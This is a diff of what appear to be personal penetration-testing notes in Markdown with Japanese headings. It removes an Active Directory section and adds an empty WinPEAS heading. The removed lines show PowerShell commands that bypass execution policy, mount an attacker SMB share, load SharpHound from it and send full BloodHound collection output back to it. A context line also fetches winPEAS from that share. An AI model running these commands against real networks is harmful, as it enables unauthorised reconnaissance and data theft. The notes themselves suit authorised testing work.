@@ -99,18 +99,10 @@ cp \\192.168.49.104\share\winPEASx64.exe .
 ---
 ---
 
-# AD
+# WinPEAS
 
-## Auto w/ BloodHound
+## 記録用総出力（長い）
 
-```zsh
-# Attacker(作成済みのSMB共有を使う)
-cp /opt/bloodhound/SharpHound.ps1 share
-```
-```powershell
-# Target
-powershell -ep bypass
-net use \\192.168.49.104\share /user:username pw
-Import-Module \\192.168.49.104\share\SharpHound.ps1
-Invoke-BloodHound -CollectionMethod All -OutputDirectory \\192.168.49.104\share -ZipFileName 'audit.zip'
+```sh
+
 ```
